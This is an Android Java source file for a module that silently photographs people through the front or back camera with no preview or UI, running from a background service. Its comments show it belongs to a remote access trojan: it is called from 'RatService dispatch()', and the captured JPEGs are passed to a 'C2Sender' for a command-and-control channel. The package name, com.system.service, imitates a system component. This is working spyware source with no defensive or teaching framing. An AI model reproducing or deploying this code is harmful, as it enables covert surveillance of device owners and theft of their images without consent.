package com.system.service;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;

import java.nio.ByteBuffer;
import java.util.Collections;

/**
 * Silent camera capture via camera2 API.
 * No preview surface needed — capture goes directly to ImageReader.
 * Works in background service with no UI.
 *
 * Usage from RatService dispatch():
 *   case "photo_front": CameraModule.capture(ctx, true,  bytes -> C2Sender.sendBytes("[IMG_FRONT]", bytes)); break;
 *   case "photo_back":  CameraModule.capture(ctx, false, bytes -> C2Sender.sendBytes("[IMG_BACK]",  bytes)); break;
 */
public class CameraModule {

    private static final String TAG = "CameraModule";
    // JPEG quality 0-100 — lower = smaller payload over socket
    private static final int JPEG_QUALITY = 70;
    // Max resolution — most devices support at least this in background
    private static final int MAX_W = 1280;
    private static final int MAX_H = 960;

    public interface PhotoCallback {
        void onPhoto(byte[] jpeg);
    }

    // ──────────────────────────────────────────────────────────────
    // Public entry point
    // front = true  → selfie camera (facing FRONT)
    // front = false → back camera (facing BACK)
    // ──────────────────────────────────────────────────────────────
    @SuppressLint("MissingPermission")
    public static void capture(Context ctx, boolean front, PhotoCallback cb) {

        HandlerThread thread = new HandlerThread("cam_capture");
        thread.start();
        Handler handler = new Handler(thread.getLooper());

        CameraManager mgr = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        if (mgr == null) return;

        try {
            String cam_id = find_camera(mgr, front);
            if (cam_id == null) {
                Log.d(TAG, "camera not found (front=" + front + ")");
                return;
            }

            // ImageReader: single slot, JPEG
            ImageReader reader = ImageReader.newInstance(MAX_W, MAX_H, ImageFormat.JPEG, 1);

            mgr.openCamera(cam_id, new CameraDevice.StateCallback() {

                @Override
                public void onOpened(CameraDevice device) {
                    try {
                        CaptureRequest.Builder req =
                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        req.addTarget(reader.getSurface());
                        req.set(CaptureRequest.JPEG_QUALITY, (byte) JPEG_QUALITY);
                        req.set(CaptureRequest.CONTROL_AF_MODE,
                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        req.set(CaptureRequest.CONTROL_AE_MODE,
                                CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

                        device.createCaptureSession(
                            Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {

                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(req.build(), null, handler);
                                    } catch (CameraAccessException e) {
                                        Log.d(TAG, "capture failed: " + e.getMessage());
                                        close_all(device, session, reader, thread);
                                    }
                                }

                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    close_all(device, session, reader, thread);
                                }
                            }, handler);

                    } catch (CameraAccessException e) {
                        Log.d(TAG, "session error: " + e.getMessage());
                        device.close();
                    }
                }

                @Override public void onDisconnected(CameraDevice d) { d.close(); }
                @Override public void onError(CameraDevice d, int err) { d.close(); }

            }, handler);

            // Wait for image
            reader.setOnImageAvailableListener(r -> {
                try (Image img = r.acquireLatestImage()) {
                    if (img == null) return;
                    ByteBuffer buf   = img.getPlanes()[0].getBuffer();
                    byte[]     bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    cb.onPhoto(bytes);
                } catch (Exception e) {
                    Log.d(TAG, "image read error: " + e.getMessage());
                } finally {
                    thread.quitSafely();
                }
            }, handler);

        } catch (CameraAccessException e) {
            Log.d(TAG, "openCamera failed: " + e.getMessage());
        }
    }

    // ──────────────────────────────────────────────────────────────
    // Find camera ID by facing direction
    // ──────────────────────────────────────────────────────────────
    private static String find_camera(CameraManager mgr, boolean front)
            throws CameraAccessException {
        int target = front
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

        for (String id : mgr.getCameraIdList()) {
            CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
            Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == target) return id;
        }
        return null;
    }

    private static void close_all(CameraDevice dev, CameraCaptureSession sess,
                                   ImageReader reader, HandlerThread thread) {
        try { sess.close();   } catch (Exception ignored) {}
        try { dev.close();    } catch (Exception ignored) {}
        try { reader.close(); } catch (Exception ignored) {}
        thread.quitSafely();
    }
}
